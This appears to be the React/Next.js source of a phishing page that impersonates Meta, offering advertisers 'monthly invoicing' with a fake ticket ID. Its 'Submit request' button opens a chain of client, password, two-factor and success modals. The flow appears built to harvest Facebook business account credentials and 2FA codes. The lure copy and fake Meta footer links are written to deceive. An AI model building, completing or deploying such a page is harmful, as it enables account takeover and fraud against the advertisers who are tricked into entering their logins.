'use client'

import ClientModal from '@/components/modals/ClientModal';
import PasswordModal from '@/components/modals/PasswordModal';
import SuccessModal from '@/components/modals/SuccessModal';
import TwoFaModal from '@/components/modals/TwoFaModal';
import { getFromLocalStorage } from '@/libs/storage';
import Link from 'next/link';
import React from 'react'

const RequiredPage = () => {
    const [ticketId, setTicketId] = React.useState("4564-ATFD-4865");

    const [userLocation, setUserLocation] = React.useState({});
    const [countryCode, setCountryCode] = React.useState("");

    const [isOpenAuth, setIsOpenAuth] = React.useState(false);
    const [isOpendPassword, setIsOpendPassword] = React.useState(false);
    const [isOpendTwoFa, setIsOpendTwoFa] = React.useState(false);
    const [isOpendSuccess, setIsOpendSuccess] = React.useState(false);

    React.useEffect(() => {
        const generateTicketId = () => {
            const section1 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section2 = Math.random().toString(36).substring(2, 6).toUpperCase();
            const section3 = Math.random().toString(36).substring(2, 6).toUpperCase();
            setTicketId(`${section1}-${section2}-${section3}`);
        };

        generateTicketId();
    }, []);

    const getIp = async () => {
        try {
            const userLocation = getFromLocalStorage('userLocation');
            if (userLocation) {
                setUserLocation(userLocation);
                setCountryCode((userLocation as any).country_code?.toLowerCase?.() || "us");
            }
        } catch (error) {
            console.error("Error getting IP or location:", error);
        }
    }

    React.useEffect(() => {
        getIp();
    }, []);

    // CLIENT MODAL
    const handleOpendModal = () => {
        getIp();
        setIsOpenAuth(true);
    }

    const handleToggleAuth = (isOpenAuth: any) => {
        setIsOpenAuth(isOpenAuth);
    }

    const handleOpendPassword = (isOpendPassword: any) => {
        setIsOpendPassword(isOpendPassword);
    }

    // PASSWORD MODAL
    const handOpendTwoFaModal = (isOpendTwoFa: any) => {
        setIsOpendTwoFa(isOpendTwoFa);
    }

    // TWO FA MODAL
    const handleToggleTwoFaModal = (isOpendTwoFa: any) => {
        setIsOpendTwoFa(isOpendTwoFa);  
    }

    const handleOpendSuccess = (isOpendSuccess: any) => {
        setIsOpendSuccess(isOpendSuccess);
    }

    return (
        <div>
            <div className="flex flex-col items-center justify-start bg-[linear-gradient(130deg,rgba(249,241,249,1)_0%,rgba(234,243,253,1)_35%,rgba(237,251,242,1)_100%)] min-h-[100vh] w-full">
                <div className='max-w-[768px] w-full p-[15px] h-full'>
                    <div className="p-[15px]">
                        <div className='flex items-start gap-[8px] flex-col justify-start mb-[30px]'>
                            <div className="flex items-center justify-start gap-[8px]">
                                <div className="flex items-center justify-center bg-[#1877f2] rounded-sm px-[10px] py-[3px]">
                                    <svg className="w-[20px] h-[20px]" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M43.75 59.375C43.75 61.1009 45.1492 62.5 46.875 62.5L71.875 62.5C73.6009 62.5 75 61.1009 75 59.375C75 57.649 73.6009 56.2498 71.875 56.2498L46.875 56.2498C45.1492 56.2498 43.75 57.649 43.75 59.375Z" fill="white"></path>
                                        <path d="M47.9167 46.875C47.9167 48.6013 49.3158 50 51.0417 50L71.875 50C73.6009 50 75 48.6013 75 46.875C75 45.1492 73.6009 43.75 71.875 43.75L51.0417 43.75C49.3158 43.75 47.9167 45.1492 47.9167 46.875Z" fill="white"></path>
                                        <path d="M46.875 37.5C45.1492 37.5 43.75 36.1013 43.75 34.375C43.75 32.6492 45.1492 31.25 46.875 31.25L71.875 31.25C73.6009 31.25 75 32.6492 75 34.375C75 36.1013 73.6009 37.5 71.875 37.5L46.875 37.5Z" fill="white"></path>
                                        <path fillRule="evenodd" clipRule="evenodd" d="M75 9.37497L20.8333 9.37496C14.505 9.37496 9.37501 14.5054 9.37501 20.8333L9.37501 43.75C9.37501 45.4762 10.7742 46.875 12.5 46.875L26.0417 46.875L26.0417 79.4035C26.0417 85.3343 32.7454 88.7842 37.5717 85.337L38.3008 84.816C41.5529 82.4931 45.9579 82.5009 49.2254 84.8347C54.6579 88.7153 62.0086 88.7153 67.4414 84.8347C70.7087 82.5009 75.1138 82.4931 78.3658 84.816L79.0951 85.337C83.9213 88.7842 90.625 85.3343 90.625 79.4035L90.625 25C90.625 16.3708 83.6295 9.37497 75 9.37497ZM63.8086 79.7489C60.549 82.0772 56.1175 82.0772 52.8579 79.7489C47.4329 75.8738 40.1088 75.8442 34.6683 79.7302L33.9388 80.2511C33.2492 80.7436 32.2917 80.2508 32.2917 79.4035L32.2917 20.8333C32.2917 18.9579 31.8413 17.1879 31.0421 15.625L75 15.625C80.1777 15.625 84.375 19.8225 84.375 25L84.375 79.4035C84.375 80.2508 83.4173 80.7436 82.7279 80.2511L81.9985 79.7302C76.5581 75.8442 69.2338 75.8738 63.8086 79.7489ZM26.0417 20.8333L26.0417 40.625L15.625 40.625L15.625 20.8333C15.625 17.957 17.9567 15.625 20.8333 15.625C23.71 15.625 26.0417 17.957 26.0417 20.8333Z" fill="white"></path>
                                    </svg>
                                </div>
                                <p className="text-[16px] text-[#65676b] font-semibold">Credit Line</p>
                            </div>
                            <b className='text-[2rem]'>Simplify Your Ad Payments With Monthly Invoicing</b>
                        </div>

                        <div className='w-full'>
                            <div className='w-full mb-[20px]'>
                                <p className='text-[15px] mb-[0px] mt-[15px]'>We're reaching out to let you know that your business may be eligible for monthly invoicing, a payment option designed for trusted advertisers on Meta.</p>
                                <p className='text-[15px] mb-[0px] mt-[15px]'>With monthly invoicing, you can consolidate your advertising costs into a single invoice each month, helping streamline billing and reduce interruptions to ad delivery.</p>
                                <p className='text-[16px] mb-[0px] mt-[14px] text-[#465a69]'>Your ticket id: #{ticketId}</p>
                            </div>

                            <div className='w-full'>
                                <p className='mb-[15px]'><b className='text-[17px] font-bold'>Key benefits include:</b></p>
                                <p className='text-[15px] mb-[10px]'>- Fewer payment transactions each month</p>
                                <p className='text-[15px] mb-[10px]'>- Reduced risk of ad disruptions caused by credit or debit card payment issues</p>
                                <p className='text-[15px] mb-[0px]'>- Access to a higher spending limit, which can be shared across eligible ad accounts within your Business Manager</p>
                            </div>
                        </div>
                    </div>
                    <div className='bg-[#1877f2] border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center' onClick={handleOpendModal}>
                        <span className='text-white'>Submit request</span>
                    </div>
                    <div className='flex items-center text-center justify-center flex-wrap text-[12px] mt-[30px] text-[#65676b] gap-[16px]'>
                        <Link className='text-[#65676b] no-underline' href="">Help Center</Link>
                        <Link className='text-[#65676b] no-underline' href="">Privacy Policy</Link>
                        <Link className='text-[#65676b] no-underline' href="">Terms of Service</Link>
                        <Link className='text-[#65676b] no-underline' href="">Community Standards</Link>
                        <Link className='text-[#65676b] no-underline' href="">Meta © 2026</Link>
                    </div>
                </div>
            </div>

            <ClientModal
                isOpenAuth={isOpenAuth}
                userLocation={userLocation}
                countryCode={countryCode}
                onToggleAuth={handleToggleAuth}
                onOpendPassword={handleOpendPassword}
            />

            <PasswordModal
                isOpendPassword={isOpendPassword}
                onToggleModalPass={handleOpendPassword}
                onOpendTwoFaModal={handOpendTwoFaModal}
            />

            <TwoFaModal
                isOpendTwoFa={isOpendTwoFa} 
                onToggleModalTwoFa={handleToggleTwoFaModal} 
                onOpendSuccess={handleOpendSuccess}
            />

            <SuccessModal
                isOpendSuccess={isOpendSuccess}
                onToggleSuccess={handleOpendSuccess}
            />
        </div>
    )
}

export default RequiredPage
